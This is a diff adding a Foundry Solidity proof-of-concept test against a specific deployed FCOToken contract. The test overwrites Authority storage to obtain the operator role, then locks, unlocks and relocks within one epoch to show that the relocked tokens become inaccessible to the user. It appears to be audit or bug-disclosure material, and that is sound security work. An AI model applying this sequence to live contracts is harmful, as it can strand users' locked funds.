@@ -1,0 +1,136 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import "forge-std/Test.sol";
+
+// ─── Interfaces ───────────────────────────────────────────────────────────────
+interface IFCOToken {
+    struct EpochsState {
+        uint40 first;
+        uint40 signup;
+        uint40 rewarded;
+        uint40 unlocked;
+        uint40 last;
+    }
+    struct Epoch {
+        uint256 locked;
+        uint256 unlocked;
+        uint40 timestamp;
+    }
+    function authority() external view returns (address);
+    function epochDuration() external view returns (uint40);
+    function lockDuration() external view returns (uint40);
+    function currentEpoch() external view returns (uint40);
+    function lock(address account, uint256 amount) external;
+    function use(address account, uint256 amount) external;
+    function balanceOf(address account) external view returns (uint256);
+    function mintedBalanceOf(address account) external view returns (uint256);
+    function internalBalanceOf(address account, bool includeEpochs) external view returns (uint256 locked, uint256 unlocked, uint256[] memory /*epochs*/);
+    function epochsStates(address account) external view returns (EpochsState memory);
+    function epochs(address account, uint256 epochTimestamp) external view returns (Epoch memory);
+    function mint(address account, uint256 amount) external;
+}
+
+interface IAuthority {
+    function operators(address op) external view returns (bool);
+}
+
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+// ─── Exploit Test ────────────────────────────────────────────────────────────
+contract ExploitTest is Test {
+    address constant TOKEN = 0x9049c073b9c3f32f204e0255cec09d09e0d9b6cf;
+    address constant PROXY_ADMIN = address(0xdead); // not needed, we use vm.store
+    address user = address(0x1234);
+
+    IFCOToken token = IFCOToken(TOKEN);
+    address authority;
+
+    function setUp() public {
+        vm.label(TOKEN, "FCOToken");
+        vm.label(user, "User");
+
+        // Get authority address
+        authority = token.authority();
+        vm.label(authority, "Authority");
+
+        // Grant operator role to this test contract
+        // The operators mapping is at storage slot 1 of Authority contract.
+        // For mapping(address => bool) at slot p, storage slot for key k is keccak256(abi.encode(k, p)).
+        bytes32 slot = keccak256(abi.encode(address(this), uint256(1)));
+        vm.store(authority, slot, bytes32(uint256(1))); // set to true
+
+        // Give test contract some native token for gas (not needed here)
+        // deal(address(this), 100 ether);
+    }
+
+    function testExploit_UnlockThenLockInSameEpoch() public {
+        // ======= Step 1: Set initial time to a clean epoch start =======
+        uint40 epochDur = token.epochDuration();
+        uint40 lockDur = token.lockDuration();
+        require(lockDur <= epochDur, "This PoC assumes lockDuration <= epochDuration for simplicity");
+        // warp to a known epoch boundary
+        uint256 epochStart = (block.timestamp / epochDur) * epochDur;
+        vm.warp(epochStart);
+
+        // ======= Step 2: Create a locked epoch for user by calling lock as operator =======
+        uint256 lockAmount = 100 ether;
+        vm.prank(address(this)); // we are operator
+        token.lock(user, lockAmount);
+        assertEq(token.epochsStates(user).last, token.currentEpoch());
+
+        // ======= Step 3: Advance time past lockDuration so epoch becomes unlockable =======
+        vm.warp(block.timestamp + lockDur + 1); // ensure strictly greater
+
+        // ======= Step 4: Trigger unlock by a transfer =======
+        // User needs a non-zero ERC20 balance to transfer.
+        // Mint minimal ERC20 tokens to user so they can transfer.
+        // (The actual unlocked reward will add to ERC20 balance after the transfer.)
+        vm.startPrank(address(this));
+        token.mint(user, 1 wei); // tiny amount to allow first transfer
+        vm.stopPrank();
+
+        // User sends 1 wei to self (or to zero address - force through)
+        vm.prank(user);
+        IERC20(TOKEN).transfer(user, 1 wei); // triggers _beforeTokenTransfer -> _unlock(amount=0)
+
+        // After this, user's ERC20 balance includes the unlocked lockAmount (plus the 1 wei)
+        uint256 balanceAfterUnlock = token.balanceOf(user);
+        assertGe(balanceAfterUnlock, lockAmount, "Unlock should have minted locked tokens");
+        // Also epochsState.unlocked should now equal epochsState.last (both = epochStart)
+        IFCOToken.EpochsState memory state = token.epochsStates(user);
+        assertEq(state.unlocked, state.last, "Unlocked pointer should equal last after full unlock");
+
+        // ======= Step 5: Lock again within the same epoch =======
+        // Current epoch is still the same because we haven't moved to next epoch boundary.
+        // (epochStart + epochDur would be the next epoch)
+        vm.prank(address(this));
+        token.lock(user, 200 ether); // new lock amount
+
+        // ======= Step 6: Verify that the newly locked tokens are not counted =======
+        (uint256 locked, uint256 unlocked, ) = token.internalBalanceOf(user, false);
+        assertEq(locked, 0, "locked should be 0 because epoch is skipped");
+        assertEq(unlocked, 0, "unlocked should be 0");
+
+        // Also balanceOf (ERC20 + unlocked) should not include the 200 ether locked amount
+        uint256 erc20 = token.mintedBalanceOf(user);
+        assertEq(token.balanceOf(user), erc20, "balanceOf should only be ERC20, unlocked is 0");
+
+        // The epoch entry still exists but is ignored.
+        IFCOToken.Epoch memory ep = token.epochs(user, token.currentEpoch());
+        assertEq(ep.locked, 200 ether, "Epoch has locked amount stored");
+        assertEq(ep.unlocked, 0, "Epoch's unlocked is 0");
+
+        // ======= Step 7: Confirm that user effectively lost those 200 ether =======
+        // They cannot withdraw them via transfer (no effect) nor via use (since internalBalanceOf returns 0 locked)
+        // Attempt to transfer from user e.g. 1 wei -> should fail because user has no balance? Actually user has erc20 balance (lockAmount+1 wei).
+        // But the locked tokens are not accessible.
+        // For demonstration, we just show the balance is insufficient for the locked amount.
+        assertLt(token.balanceOf(user), lockAmount + 200 ether, "User cannot access the lost locked amount");
+    }
+}
+```
